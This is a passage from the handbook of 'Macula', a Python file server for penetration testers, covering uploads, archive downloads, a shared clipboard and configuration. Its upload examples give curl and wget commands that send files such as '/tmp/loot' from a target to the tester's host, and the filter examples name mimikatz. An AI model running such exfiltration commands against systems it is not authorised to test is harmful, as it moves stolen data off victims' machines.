<!-- file: HANDBOOK.md -->

# Macula

A small, zero-dependency file server for pentesting. Single-file-per-module Python; no external libraries, no CDN, no build step.

**macula** (Latin): *spot, focal point*, like the macula lutea in the retina.

---

## Table of contents

- [Macula](#macula)
  - [Table of contents](#table-of-contents)
  - [Quick start](#quick-start)
  - [CLI options](#cli-options)
    - [Filters](#filters)
  - [Hardcoded endpoints](#hardcoded-endpoints)
    - [Favicon](#favicon)
  - [Upload](#upload)
    - [Multipart, recommended](#multipart-recommended)
    - [Raw body, curl](#raw-body-curl)
    - [Raw body, wget](#raw-body-wget)
    - [Nested paths](#nested-paths)
    - [Fetch back what was uploaded](#fetch-back-what-was-uploaded)
    - [Response](#response)
  - [Download](#download)
    - [Single file](#single-file)
    - [Folder as archive](#folder-as-archive)
    - [Filtered archive](#filtered-archive)
    - [Virtual root as archive](#virtual-root-as-archive)
  - [File metadata (JSON)](#file-metadata-json)
  - [Rendered markdown](#rendered-markdown)
  - [Shared clipboard](#shared-clipboard)
    - [Concept](#concept)
    - [UI](#ui)
    - [Deep links](#deep-links)
    - [Autosave](#autosave)
    - [Live updates](#live-updates)
    - [Search](#search)
    - [Limits](#limits)
    - [Disabling](#disabling)
    - [CLI usage](#cli-usage)
    - [JSON shape](#json-shape)
    - [View formats summary](#view-formats-summary)
  - [URL patterns reference](#url-patterns-reference)
    - [Listing](#listing)
    - [File](#file)
    - [Folder archive](#folder-archive)
    - [Virtual root archive](#virtual-root-archive)
    - [Fingerprint (internal)](#fingerprint-internal)
    - [Redirects](#redirects)
  - [Configuration examples](#configuration-examples)
    - [Single share (served at `/`)](#single-share-served-at-)
    - [Multiple shares (virtual root at `/`)](#multiple-shares-virtual-root-at-)
    - [With upload](#with-upload)
    - [Bind to multiple interfaces](#bind-to-multiple-interfaces)
    - [Bind everything](#bind-everything)
    - [Client whitelist](#client-whitelist)
    - [HTTPS](#https)
    - [Depth-limited listing](#depth-limited-listing)
    - [Filtered listing](#filtered-listing)
    - [Custom repo URL](#custom-repo-url)
    - [Clipboard tuned for a big engagement](#clipboard-tuned-for-a-big-engagement)
    - [Clipboard disabled](#clipboard-disabled)
    - [Realistic pentest setup](#realistic-pentest-setup)
  - [Features](#features)
    - [Virtual root with multiple shares](#virtual-root-with-multiple-shares)
    - [Lazy-loaded tree UI](#lazy-loaded-tree-ui)
    - [Live search](#live-search)
    - [Auto-refresh](#auto-refresh)
    - [Shared clipboard](#shared-clipboard-1)
    - [Inline source + handbook](#inline-source--handbook)
    - [Rendered markdown viewer](#rendered-markdown-viewer)
    - [JSON file metadata](#json-file-metadata)
    - [Filtered archives](#filtered-archives)
    - [Nested uploads](#nested-uploads)
    - [Filters](#filters-1)
    - [Depth limit](#depth-limit)
    - [Upload with token](#upload-with-token)
    - [Streamed downloads](#streamed-downloads)
    - [Symlink safety](#symlink-safety)
    - [Path traversal protection](#path-traversal-protection)
  - [Design choices](#design-choices)
    - [Token-scoped internal endpoints](#token-scoped-internal-endpoints)
    - [Single mount → root, multiple mounts → virtual root](#single-mount--root-multiple-mounts--virtual-root)
    - [Mount name collisions](#mount-name-collisions)
    - [Upload folder is a normal share](#upload-folder-is-a-normal-share)
    - [Nested mounts: longest root wins](#nested-mounts-longest-root-wins)
    - [Fingerprint algorithm](#fingerprint-algorithm)
    - [Single disk pass for HTML render](#single-disk-pass-for-html-render)
    - [Streamed file transfer](#streamed-file-transfer)
    - [Symlink policy](#symlink-policy)
    - [Upload safety](#upload-safety)
    - [Nested upload paths](#nested-upload-paths)
    - [Archive content](#archive-content)
    - [Markdown renderer](#markdown-renderer)
    - [Heading anchors](#heading-anchors)
    - [No auto-generated table of contents](#no-auto-generated-table-of-contents)
    - [Clipboard storage](#clipboard-storage)
    - [Clipboard eviction](#clipboard-eviction)
    - [Clipboard search uses `re.search`](#clipboard-search-uses-research)
    - [Clipboard preview allocation](#clipboard-preview-allocation)
    - [Clipboard autosave cadence](#clipboard-autosave-cadence)
    - [Clipboard poll preserves cursor](#clipboard-poll-preserves-cursor)
    - [Clipboard inflight serialization](#clipboard-inflight-serialization)
    - [Clipboard view formats](#clipboard-view-formats)
    - [`X-Content-Type-Options: nosniff` on every response](#x-content-type-options-nosniff-on-every-response)
    - [`favicon.ico` returns 204](#faviconico-returns-204)
    - [HEAD = GET without body](#head--get-without-body)
    - [301 preserves query string](#301-preserves-query-string)
    - [Filter prunes empty directories](#filter-prunes-empty-directories)
    - [Sort order](#sort-order)
    - [`_preview` on single rooms](#_preview-on-single-rooms)
    - [`human_size`](#human_size)
    - [Server thread model](#server-thread-model)
    - [Bind failure rollback](#bind-failure-rollback)
    - [SIGINT during cleanup](#sigint-during-cleanup)
    - [Whitelist is enforced at accept time](#whitelist-is-enforced-at-accept-time)
    - [UI dropdowns built in one place](#ui-dropdowns-built-in-one-place)
    - [UI stat pills](#ui-stat-pills)
    - [Back-to-top button](#back-to-top-button)
    - [Path validation and null bytes](#path-validation-and-null-bytes)
    - [Request body handling](#request-body-handling)
    - [No authentication by design](#no-authentication-by-design)
    - [No CSRF protection](#no-csrf-protection)
    - [Inline HTML/SVG execution](#inline-htmlsvg-execution)
  - [Security notes](#security-notes)
  - [Exit codes](#exit-codes)
  - [Project layout](#project-layout)
    - [Mount layout](#mount-layout)
  - [Tuning constants](#tuning-constants)
  - [Customization](#customization)
    - [Change the source distribution format](#change-the-source-distribution-format)
    - [Add a new internal endpoint](#add-a-new-internal-endpoint)
    - [Change the fingerprint cadence](#change-the-fingerprint-cadence)
    - [Change the clipboard cadence](#change-the-clipboard-cadence)
    - [Replace the markdown renderer](#replace-the-markdown-renderer)
    - [Change the branding](#change-the-branding)
    - [Change the version](#change-the-version)
    - [Change the repo URL](#change-the-repo-url)
    - [Add a CLI flag](#add-a-cli-flag)

---

## Quick start

```bash
./macula.py -b all -p 8000 -d /tmp/share -u /tmp/loot
```

Then open `http://<your-ip>:8000/` in a browser.

At startup macula prints:

- a per-run **token** (8 hex chars, e.g. `a4eaaea0`)
- all the bind addresses
- the exact URLs for **source**, **handbook**, **clipboard** and **upload**

Example output (illustrative, paths, interfaces and mount names depend on your machine; the `depth` and `filter` lines only appear when `-D` or a positional filter is used):

```
  🟡 MACULA v0.2.0 · file server
  ────────────────────────────────────────────────────────────
  mounts    3 entries (virtual root at /)
            [share ] /test1/        -> /home/kali/Desktop/test/test1
            [share ] /test2/        -> /home/kali/Desktop/test/test2
            [upload] /test_upload/  -> /home/kali/Desktop/test/test_upload
  bind      interface lo (127.0.0.1)       ->  http://127.0.0.1:8000
  bind      interface tun0 (10.10.15.120)  ->  http://10.10.15.120:8000
  upload    /home/kali/Desktop/test/test_upload  (also exposed as a share)
  max size  2G
  format    html (default) | json | text
  client    any
  ────────────────────────────────────────────────────────────
  🔑 token     a4eaaea0
  📄 source:
     http://<host>:8000/a4eaaea0/source?format=zip
     http://<host>:8000/a4eaaea0/source?format=tgz
  📖 handbook:
     http://<host>:8000/a4eaaea0/handbook.md?view=html
     http://<host>:8000/a4eaaea0/handbook.md?view=text
  📋 clipboard  (200 rooms max, 1 MB/room, 20 MB total):
     http://<host>:8000/a4eaaea0/clipboard
     http://<host>:8000/a4eaaea0/clipboard?id=1
  📤 upload from a target  (replace <host> with a bind IP above):
     curl -X POST -F "file=@/tmp/loot" http://<host>:8000/a4eaaea0/upload
     curl --data-binary @/tmp/loot "http://<host>:8000/a4eaaea0/upload?name=loot"
     wget --post-file=/tmp/loot "http://<host>:8000/a4eaaea0/upload?name=loot"
  ────────────────────────────────────────────────────────────
  🔗 repo      https://github.com/USERNAME/macula
  ────────────────────────────────────────────────────────────
```

**The token changes every run.** Write it down or copy the whole block.

---

## CLI options

| Flag | Argument | Default | Description |
|---|---|---|---|
| `-b, --bind` | `IFACE`, `IPV4`, `all` | `127.0.0.1` | Bind address. Repeatable (`-b eth0 -b tun0`). `all` binds `0.0.0.0`. |
| `-p, --port` | `PORT` | `8000` | Listening port. |
| `-d, --dir` | `PATH` | `~` | Directory to share. Repeatable (`-d /a -d /b`). See [multiple shares](#multiple-shares-virtual-root-at-). |
| `-u, --upload-dir` | `PATH` | *(disabled)* | Folder that receives uploads. Must exist and be writable. Also exposed as a normal share. |
| `-c, --client` | `IPV4` | any | Whitelist: drop every connection from other IPs. |
| `-D, --depth` | `N` | unlimited | Max recursion depth for listings. `0` = top level only. |
| `--max-upload-size` | `SIZE` | `2G` | Max payload per upload. `0` = unlimited. Accepts `B`, `K`, `M`, `G`, `T`, `P`. |
| `--repo-url` | `URL` | constant `REPO_URL` | Override the project URL printed in the banner and linked in the UI. |
| `--no-clipboard` |, | off | Disable the shared clipboard endpoint entirely. |
| `--clipboard-max-rooms` | `N` | `200` | Max number of rooms kept. Oldest rooms evicted first. |
| `--clipboard-max-mb` | `MB` | `1` | Max size per room, in megabytes. |
| `--clipboard-max-total-mb` | `MB` | `20` | Max total size across all rooms, in megabytes. |
| `--ssl` |, | off | Enable HTTPS. Requires `--cert` and `--key`. |
| `--cert` | `FILE` | `cert.pem` | TLS certificate. |
| `--key` | `FILE` | `key.pem` | TLS private key. |
| `-v, --version` |, |, | Print version and repo URL, then exit. |
| *(positional)* | `FILTER ...` | none | Keywords or globs. Filters files by name. Repeatable. |

### Filters

Any positional argument acts as a filter on file names:

```bash
./macula.py peas                    # any file with "peas" in the name
./macula.py '*.exe'                 # glob
./macula.py peas mimikatz '*.txt'   # OR between them
```

Filters are case-insensitive. Wildcards `*` and `?` are supported. Directories that become empty after filtering are hidden.

---

## Hardcoded endpoints

**All macula-internal endpoints live under the per-run token.** Because the token is random and changes every run, internal paths can never collide with user content and are never exposed in directory listings.

Replace `{token}` with the value printed at startup.

| Endpoint | Method | Description |
|---|---|---|
| `/{token}/source?format=zip` | `GET` | Download macula's own source as `macula.zip`. |
| `/{token}/source?format=tgz` | `GET` | Download macula's own source as `macula.tar.gz`. |
| `/{token}/handbook.md?view=html` | `GET` | Rendered `HANDBOOK.md` (this file). |
| `/{token}/handbook.md?view=text` | `GET` | Raw `HANDBOOK.md`. |
| `/{token}/clipboard` | `GET` | Shared clipboard UI. |
| `/{token}/clipboard?format=json` | `GET` | Rooms list / single room as JSON. |
| `/{token}/clipboard?format=text` | `GET` | Rooms list / single room as plain text. |
| `/{token}/clipboard?format=raw&id=N` | `GET` | Raw text body of room `N`. Pipe-friendly. |
| `/{token}/clipboard?action=create` | `POST` | Create a room. Body = initial text. |
| `/{token}/clipboard?action=update&id=N` | `POST` | Replace room `N` text. Body = new text. |
| `/{token}/clipboard?action=clear&id=N` | `POST` | Empty room `N` text. Room stays. |
| `/{token}/clipboard?action=delete&id=N` | `POST` | Delete room `N`. |
| `/{token}/clipboard?action=clear_all` | `POST` | Delete every room. |
| `/{token}/upload` | `POST` | Receive uploaded files. |

`HEAD` on every endpoint returns the same status and headers as `GET`, without a body. This includes the clipboard endpoint.

Missing or invalid parameters return `400` with a hint instead of guessing.

```
GET /{token}/source
→ 400 Missing ?format parameter.
  Use /{token}/source?format=zip
  or  /{token}/source?format=tgz
```

```
GET /{token}/handbook.md?view=pdf
→ 400 Invalid view: 'pdf'. Use 'html' or 'text'.
```

```
GET /{token}/clipboard?format=raw
→ 400 format=raw requires &id=N
```

### Favicon

`GET /favicon.ico` returns `204 No Content`. The pages embed an inline SVG favicon via a `data:` URI, so this endpoint only exists to silence browser probes.

---

## Upload

Two body shapes are supported: **multipart/form-data** and **raw body with `?name=`**.

### Multipart, recommended

```bash
curl -X POST -F "file=@/tmp/loot" http://KALI:8000/TOKEN/upload
```

Multiple files in one request:

```bash
curl -X POST -F "file=@/tmp/a" -F "file=@/tmp/b" http://KALI:8000/TOKEN/upload
```

### Raw body, curl

Useful when you want to control the destination filename via query string.

```bash
curl --data-binary @/tmp/loot "http://KALI:8000/TOKEN/upload?name=loot"
```

### Raw body, wget

Handy when the target has wget but not curl.

```bash
wget --post-file=/tmp/loot "http://KALI:8000/TOKEN/upload?name=loot"
```

### Nested paths

The `name` query parameter accepts a relative path. Parent directories are created on the fly. Each path segment is sanitized individually; `.` and `..` segments are rejected.

```bash
curl --data-binary @/tmp/hosts \
  "http://KALI:8000/TOKEN/upload?name=windows/system32/drivers/etc/hosts"
```

Writes `<upload_dir>/windows/system32/drivers/etc/hosts`.

Multipart uploads follow the same rule if the filename carries a path separator.

The upload path is confined to `<upload_dir>`. Failure modes and their status codes:

- a `..` segment → `400`
- an absolute POSIX path (`/etc/passwd`) → `400`
- an absolute Windows path (`C:\…` or `\\host\share\…`) → `400`
- a destination that resolves outside the upload root (for example through a symlinked parent directory) → `400`
- a symlink **at the destination** (that resolves inside the upload root) → `409`

A multipart part without a `filename` is skipped silently. If no valid file remains, the response is `400 "No files found in request"`.

### Fetch back what was uploaded

Uploads land in the upload folder, which is also exposed as a share. Its URL depends on the mount layout:

```bash
curl -O http://KALI:8000/UPLOAD_SHARE/<filename>
```

See [mount layout](#mount-layout) to know what `UPLOAD_SHARE` is in your case.

### Response

Success (identical shape for both raw and multipart bodies):

```json
{
  "ok": true,
  "saved": [
    {"name": "loot", "size": 1234, "path": "/tmp/loot/loot"}
  ],
  "errors": [],
  "target": "/tmp/loot"
}
```

For a nested upload, `name` is the relative path **after sanitization** (see §"Upload safety"), and `path` is the absolute server path. `errors` is always present; the raw-body branch fills it with `[]`, the multipart branch fills it with the names of files that were rejected.

Failure responses:

| Situation | Status | Body |
|---|---|---|
| Missing / empty body | `400` | `{"ok": false, "error": "Empty request body"}` |
| `?name=` absent and body not multipart | `400` | `{"ok": false, "error": "Unsupported upload. Use multipart/form-data, or add ?name=filename for raw body upload."}` |
| Invalid filename (empty, absolute, `..`) | `400` | `{"ok": false, "error": "Invalid filename (empty, absolute, or '..' present)"}` |
| Destination escapes upload root | `400` | `{"ok": false, "error": "Upload path escapes upload root"}` |
| Symlink at destination | `409` | `{"ok": false, "error": "Refusing to overwrite symlink: /abs/path"}` |
| Payload too large | `413` | `{"ok": false, "error": "Payload too large: 3G (max 2G)"}` |
| Uploads disabled (`-u` not passed) | `403` | `{"ok": false, "error": "Uploads are disabled on this server"}` |
| Write failure (disk full, permission) | `500` | `{"ok": false, "error": "Write failed: …"}` |

`413` closes the connection immediately (no partial read). Other errors keep the connection alive.

---

## Download

### Single file

```
GET /MOUNT/file.txt                 → served inline
GET /MOUNT/file.txt?mode=view       → served inline (same as above)
GET /MOUNT/file.txt?mode=download   → Content-Disposition: attachment
```

### Folder as archive

```
GET /MOUNT/sub/?download=zip        → zip archive of the folder
GET /MOUNT/sub/?download=tgz        → tar.gz archive of the folder
```

The archive is built in a temporary file on disk (not in RAM) and streamed. Symlinks are skipped. The archive filename is derived from the folder name, sanitized to `[A-Za-z0-9._-]`.

### Filtered archive

Add `&match=<glob>` to keep only files whose name matches (case-insensitive `fnmatch`). Directories are still traversed; only file entries are filtered.

```
GET /MOUNT/sub/?download=zip&match=*.conf
```

Downloads a zip containing only `*.conf` files (at any depth under `sub/`).

```
GET /MOUNT/sub/?download=tgz&match=report_*.csv
```

Same for tar.gz.

The glob applies to the **basename** only, not the full path. `sub/**/a.conf` and `sub/b.conf` are both matched by `*.conf`.

### Virtual root as archive

When the server has multiple mounts, `GET /?download=zip` (or `?download=tgz`) walks **every** mount and produces a single archive. Entries are prefixed with `<mount_name>/`, so the tree survives the round-trip:

```
GET /?download=zip   →  macula-root.zip
                        ├── tools/...
                        └── loot/...
```

The `match=` glob applies here too:

```
GET /?download=zip&match=*.conf
```

The archive is streamed from a temp file, symlinks are skipped, and filenames are the same `macula-root.zip` / `macula-root.tar.gz` regardless of the current date.

---

## File metadata (JSON)

A single file can be queried for metadata instead of being streamed:

```
GET /MOUNT/file.txt?format=json
```

Response:

```json
{
  "name": "file.txt",
  "path": "/abs/path/to/file.txt",
  "size": 1234,
  "size_human": "1K",
  "mtime": 1791192314,
  "mime": "text/plain",
  "view_url":     "/MOUNT/file.txt?mode=view",
  "download_url": "/MOUNT/file.txt?mode=download"
}
```

For `.md` and `.markdown` files, an additional `render_url` is present:

```json
{
  "render_url": "/MOUNT/file.txt?mode=render"
}
```

`format=json` on a file is read-only, the file content is not included. Use `?mode=view` or `?mode=download` for the body.

The `mtime` field here is in **seconds**. The listing tree JSON (`_tree_to_json`) exposes `mtime` in **nanoseconds**, see §"Fingerprint algorithm".

---

## Rendered markdown

`.md` and `.markdown` files can be rendered to HTML inline:

```
GET /MOUNT/notes.md?mode=render
```

The renderer is the same one that serves `/{token}/handbook.md`. It supports headings, paragraphs, fenced code blocks, inline code, bold, italic, links, ordered/unordered lists with nesting, blockquotes, horizontal rules, and pipe tables. HTML is escaped before parsing.

Refused with `400` if the file extension is not `.md` / `.markdown`. Refused with `413` if the file is larger than 5 MB (guard against accidentally rendering a huge log).

Rendered pages reuse the handbook stylesheet and include the sticky back-to-top button.

---

## Shared clipboard

The clipboard is a collection of named **rooms**. Each room is a single text buffer identified by an integer id, visible to every connected client. Editing a room updates it for everyone. This solves the "I can't copy text out of an RDP session" problem without needing shared clipboards.

### Concept

- **Room**, one text buffer, one integer id, one timestamp.
- **Client**, any browser tab that opens the clipboard URL.
- All rooms are visible to everyone. There is no per-room ACL.
- State lives in RAM on the server. Restarting macula wipes every room.

### UI

`GET /{token}/clipboard` opens a two-pane interface:

- **Left**, search box, list of rooms (newest first). Each row shows id, size, age, first-line preview. The selected room is highlighted.
- **Right**, editable textarea for the selected room, plus a toolbar: Copy, Save now, Clear text, Delete room, and view links (JSON / Text / Raw).

Top-right corner has four controls:

- **+ New room**, creates an empty room and selects it.
- **Clear all**, deletes every room (asks for confirmation).
- **JSON | Text**, view-links for the room list.
- **Back to files**, return to the file browser.

### Deep links

The room id is part of the URL:

```
http://HOST:8000/{token}/clipboard?id=3
```

Opening that URL selects room 3 automatically. `history.replaceState` keeps the browser URL in sync as you click rooms, so you can share the current URL.

### Autosave

Edits are debounced: 1.5 s after you stop typing, the textarea content is pushed to the server. The dot next to the room number:

- **yellow**, unsaved local changes
- **green flash**, just saved
- **hidden**, in sync with the server

`Ctrl+Enter` forces a synchronous save. `Save now` button does the same.

If the tab is closed with unsaved edits, a `navigator.sendBeacon` request is fired in `beforeunload`. Best effort, not guaranteed.

### Live updates

Each open tab polls the selected room every 3 s. If the server text changed and the local textarea is **not dirty**, the textarea is refreshed and cursor/scroll position preserved. If the textarea **is** dirty, the change is deferred and the header shows "edited locally · server changed HH:MM:SS". Autosave resolution is last-writer-wins.

### Search

The sidebar search filters the rooms list. Two modes:

- **substring** (default), case-insensitive substring match across the full text of every room
- **regex**, full regular expression, case-insensitive

Toggle with the `.*` button or `Alt+R`. Invalid regexes turn the toggle red and show `invalid regex` in the meta bar. Matches are highlighted in the room preview.

Search runs server-side via `?q=<query>[&regex=1]`; the filter propagates to the JSON / Text view links at the top of the sidebar.

### Limits

- **Max rooms**, 200 by default (`--clipboard-max-rooms`).
- **Max per room**, 1 MB by default (`--clipboard-max-mb`).
- **Max total**, 20 MB by default (`--clipboard-max-total-mb`).

When any limit is exceeded, the **oldest** rooms are evicted first (FIFO on the `ts` timestamp, which is refreshed on every `update` / `clear`). Consequence: a room that is being actively edited is never evicted before an older idle room, and a freshly created room is not evicted until a newer one exists.

Oversized bodies are rejected with `413` **before** being read (`--clipboard-max-mb`).

The **total budget** (`--clipboard-max-total-mb`) is checked after insertion. If a single room exceeds the total budget by itself, the eviction loop removes it immediately, and `create` returns `200 {"ok": true, "id": N, …}` for a room that no longer exists. The CLI prints a warning when the total is smaller than the per-room limit:

```
[!] Warning: --clipboard-max-total-mb is smaller than --clipboard-max-mb;
    the first room may already exceed the total budget.
```

### Disabling

```bash
./macula.py --no-clipboard
```

The endpoint returns `404 Clipboard disabled`, the header dropdown and stats pill are hidden, and the JSON listing omits `clipboard_endpoint`.

### CLI usage

```bash
HOST=http://127.0.0.1:8000
TOKEN=a4eaaea0

# list rooms (JSON)
curl -s "$HOST/$TOKEN/clipboard?format=json" | jq

# list rooms (plain text with URLs)
curl -s "$HOST/$TOKEN/clipboard?format=text"

# read a room (raw body only, pipes cleanly)
curl -s "$HOST/$TOKEN/clipboard?format=raw&id=1"

# read a room (with header)
curl -s "$HOST/$TOKEN/clipboard?format=text&id=1"

# create an empty room
curl -s -X POST "$HOST/$TOKEN/clipboard?action=create"

# create a room with content (from stdin)
echo "something" | curl -s -X POST --data-binary @- "$HOST/$TOKEN/clipboard?action=create"

# replace room 1
echo "new content" | curl -s -X POST --data-binary @- "$HOST/$TOKEN/clipboard?action=update&id=1"

# clear room 1 (room stays)
curl -s -X POST "$HOST/$TOKEN/clipboard?action=clear&id=1"

# delete room 1
curl -s -X POST "$HOST/$TOKEN/clipboard?action=delete&id=1"

# delete all rooms
curl -s -X POST "$HOST/$TOKEN/clipboard?action=clear_all"

# regex search
curl -s "$HOST/$TOKEN/clipboard?format=json&q=^error%3A&regex=1"

# put the first room's content on the local clipboard
curl -s "$(curl -s "$HOST/$TOKEN/clipboard?format=json" | jq -r '.rooms[0].url_raw')" \
  | xclip -selection clipboard
```

### JSON shape

`?format=json` (list):

```json
{
  "ok": true,
  "count": 1,
  "filtered": false,
  "query": null,
  "regex": null,
  "urls": {
    "list_html": "http://127.0.0.1:8000/abda3d02/clipboard",
    "list_json": "http://127.0.0.1:8000/abda3d02/clipboard?format=json",
    "list_text": "http://127.0.0.1:8000/abda3d02/clipboard?format=text",
    "list_html_filtered": "...",
    "list_json_filtered": "...",
    "list_text_filtered": "..."
  },
  "rooms": [
    {
      "id": 1,
      "size": 633,
      "ts": 1791192314.3154135,
      "preview": "Lorem Ipsum is simply dummy text…",
      "url_html": "http://127.0.0.1:8000/abda3d02/clipboard?id=1",
      "url_json": "http://127.0.0.1:8000/abda3d02/clipboard?format=json&id=1",
      "url_text": "http://127.0.0.1:8000/abda3d02/clipboard?format=text&id=1",
      "url_raw":  "http://127.0.0.1:8000/abda3d02/clipboard?format=raw&id=1"
    }
  ]
}
```

`?format=json&id=1` (single room) returns the same shape with `text` included and no `preview`.

### View formats summary

| `format=` | with `&id=N` | without `&id=N` |
|---|---|---|
| *(default)* / `html` | UI with room preselected | UI with empty viewer |
| `json` | `{ok, room: {...}}`, text included | `{ok, count, urls, rooms: [...]}` |
| `text` | header + text body | two lines per room (summary + URL) |
| `raw` | text body only | `400`, requires id |

Two additional rows for `&id=N` with an unknown `N`:

| `format=` | `&id=999` (unknown room) |
|---|---|
| `json` / `text` / `raw` | `404` with `{"ok": false, "error": "No such room"}` or a plain-text `[!] No such room: 999` |
| `html` | `200` HTML, the page opens with a "Room #999 not found" placeholder and a "Create a new room" button |

When `?q=` is present, the `text` list header is augmented with a `[filter: …]` (substring) or `[/regex/: …]` (regex) suffix so a reader can see that the list is filtered.

---

## URL patterns reference

### Listing

| Path | Description |
|---|---|
| `/` | Virtual root. Only used when there are multiple mounts. |
| `/MOUNT/` | Folder listing at a share root. |
| `/MOUNT/sub/` | Subfolder listing. |
| `/?format=json` | Listing as JSON. |
| `/?format=text` | Listing as tree-style plain text. |
| `/?depth=N` | Limit listing depth. `0` = top level only. |

### File

| Path | Description |
|---|---|
| `/MOUNT/file.txt` | File inline (view). |
| `/MOUNT/file.txt?mode=view` | Same as above. |
| `/MOUNT/file.txt?mode=download` | Force `Content-Disposition: attachment`. |
| `/MOUNT/file.txt?mode=render` | Render `.md` / `.markdown` to HTML. |
| `/MOUNT/file.txt?format=json` | File metadata as JSON (no body). |
| `/MOUNT/file.txt?format=text` | `400`, `text` is valid for directories only. |

### Folder archive

| Path | Description |
|---|---|
| `/MOUNT/sub/?download=zip` | Download folder as `.zip`. |
| `/MOUNT/sub/?download=tgz` | Download folder as `.tar.gz`. |
| `/MOUNT/sub/?download=zip&match=*.conf` | Download only files matching the glob. |
| `/MOUNT/sub/?download=tgz&match=*.csv` | Same for tar.gz. |

### Virtual root archive

| Path | Description |
|---|---|
| `/?download=zip` | Download every mount as a single `.zip`. Entries are prefixed with `<mount_name>/`. |
| `/?download=tgz` | Same for `.tar.gz`. |
| `/?download=zip&match=*.conf` | Glob filter applies to file basenames across all mounts. |

### Fingerprint (internal)

| Path | Description |
|---|---|
| `/PATH?format=json&stat=1` | Returns `{"fingerprint": "<sha1>"}` for `/PATH`. Used by auto-refresh. |

`?stat=1` takes precedence over `?download=`. A request with both returns the fingerprint JSON, not an archive.

### Redirects

A missing trailing slash on a directory triggers a `301` **with the query string preserved**:

```
GET /MOUNT/sub?format=json
→ 301 Location: /MOUNT/sub/?format=json
```

---

## Configuration examples

Throughout this document:

- **mount**, any directory served by macula.
- **share**, a mount added with `-d` (or the implicit `~` when `-d` is omitted).
- **upload**, the mount added with `-u`.
- **virtual root**, the `/` listing that appears when there is more than one mount.

### Single share (served at `/`)

```bash
./macula.py -d /home/kali/tools
```

Everything in `/home/kali/tools` is browsable at `/`. No virtual root.

### Multiple shares (virtual root at `/`)

```bash
./macula.py -d /home/kali/tools -d /tmp/loot
```

Each directory appears as `/<basename>/`:

```
/            → virtual root listing
/tools/      → /home/kali/tools
/loot/       → /tmp/loot
```

Name collisions are resolved by appending `_2`, `_3`, … Only one collision-free name per share.

### With upload

```bash
./macula.py -d /home/kali/tools -u /tmp/loot
```

`/tmp/loot` is added as a third share. Upload endpoint printed at startup.

### Bind to multiple interfaces

```bash
./macula.py -b lo -b tun0 -d /tmp/share
```

Each binding gets its own server socket on the same port. `<host>` appears generically wherever a concrete IP would be misleading.

### Bind everything

```bash
./macula.py -b all
```

Equivalent to `0.0.0.0`. Every interface accepts.

### Client whitelist

```bash
./macula.py -c 10.10.15.42
```

Only `10.10.15.42` can connect. Every other IP is dropped at accept time.

### HTTPS

```bash
./macula.py --ssl --cert /etc/certs/self.pem --key /etc/certs/self.key
```

Any TLS cert works, self-signed is fine for pentest use.

### Depth-limited listing

```bash
./macula.py -D 2
```

Shows at most two directory levels in the rendered HTML/JSON/text. Subdirectories at depth 2 are still expandable in the browser (lazy-loaded one level at a time).

### Filtered listing

```bash
./macula.py -D 3 mimikatz '*.exe'
```

Only files matching `mimikatz` or `*.exe` (case-insensitive) are shown. Empty directories are pruned.

### Custom repo URL

```bash
./macula.py --repo-url https://github.com/me/macula-fork
```

Banner, header, footer, JSON listing and text listing all show the new URL. `--help` and `--version` keep the default from the constant, argparse evaluates them before `--repo-url` is parsed.

### Clipboard tuned for a big engagement

```bash
./macula.py \
  --clipboard-max-rooms 500 \
  --clipboard-max-mb 5 \
  --clipboard-max-total-mb 200
```

### Clipboard disabled

```bash
./macula.py --no-clipboard
```

### Realistic pentest setup

```bash
./macula.py \
  -b tun0 \
  -p 8080 \
  -d /opt/tools \
  -d /tmp/loot \
  -u /tmp/incoming \
  -c 10.10.15.5 \
  --max-upload-size 500M \
  --clipboard-max-mb 2
```

- Binds only the VPN interface.
- Serves `/opt/tools` and `/tmp/loot` at `/tools/` and `/loot/`.
- Receives uploads into `/tmp/incoming`, exposed as `/incoming/`.
- Accepts connections **only** from `10.10.15.5`.
- Rejects any upload larger than 500 MB.
- Caps clipboard rooms at 2 MB each.

---

## Features

### Virtual root with multiple shares

Serve as many directories as you want with `-d`. Each becomes `/<basename>/`. A special root at `/` lists all mounts.

### Lazy-loaded tree UI

The HTML tree expands one level at a time via `?format=json&depth=0`. Big directories don't stall the first page load. With `-D 0`, only the top level of the current path is shown and every folder expands on click.

### Live search

Substring or **regex** (Alt+R) filtering. Matching subtrees expand automatically. The client loads the full tree on demand to search beyond what's rendered.

### Auto-refresh

Polls `?format=json&stat=1` every 15 s (`AUTO_MS` in `app.js`) and reloads the page if the **fingerprint** changed. Detects adds, removes, renames, and modifications anywhere in the current subtree.

### Shared clipboard

See [Shared clipboard](#shared-clipboard).

### Inline source + handbook

- `/{token}/source?format=zip|tgz`, download macula itself.
- `/{token}/handbook.md?view=html|text`, read this file without shell access.

### Rendered markdown viewer

Any `.md` or `.markdown` file inside a share can be viewed as HTML with `?mode=render`. The rendered page uses the handbook stylesheet, generates heading anchors, and includes the back-to-top button.

### JSON file metadata

`?format=json` on a file returns size, mtime, MIME type, and the canonical view / download / render URLs. Useful for scripting without fetching the body.

### Filtered archives

`?download=zip&match=*.conf` produces an archive containing only the matching files. Same for `tgz`. Case-insensitive, basename-only matching.

### Nested uploads

`?name=sub/dir/file` creates the folder chain and drops the file there. Parent creation is per-upload. Traversal is blocked, symlink escape is blocked, and the destination folder is confined to `<upload_dir>`.

### Filters

Match filenames by keyword or glob. Case-insensitive.

### Depth limit

`-D N` caps the initial listing depth. The browser still lets you descend into deeper folders one level at a time.

### Upload with token

Uploads are received only at `/{token}/upload`. The token is 8 hex chars, unpredictable per run, never embedded anywhere a third party could guess it from the tree.

### Streamed downloads

Files and archives are streamed to the socket in 64 KB chunks. A 5 GB file does not sit in RAM.

### Symlink safety

- Symlinks pointing outside the share are not followed.
- Uploads refuse to overwrite symlinks (`409`).
- Upload destinations that resolve outside the upload root are rejected (`400`).
- Source archives skip symlinks entirely.

### Path traversal protection

Every request is resolved against its mount root. `..`, double encoding, and symlink loops are rejected with `404`.

---

## Design choices

This section documents behaviours that are intentional but not obvious from the outside. Anything here is a deliberate design decision, not an accident.

### Token-scoped internal endpoints

Every macula-internal path lives under `/{token}/`, where `{token}` is 8 random hex characters generated at startup. This makes it **impossible** for a file the user drops into a shared folder to shadow an internal endpoint (`macula.py`, `source`, `upload`, `clipboard`, `handbook.md`, …). There are no aliases, no legacy paths, no fallback. If the token path doesn't match exactly, the request is handled as user content.

The token is generated until it does not collide with a top-level name inside any mount, and does not collide with any mount name itself. In the (astronomically unlikely) case of ten consecutive collisions, the last generated token is used anyway.

### Single mount → root, multiple mounts → virtual root

- **Exactly one** `-d` directory (and no `-u`): that directory is served at `/`. No virtual root is created.
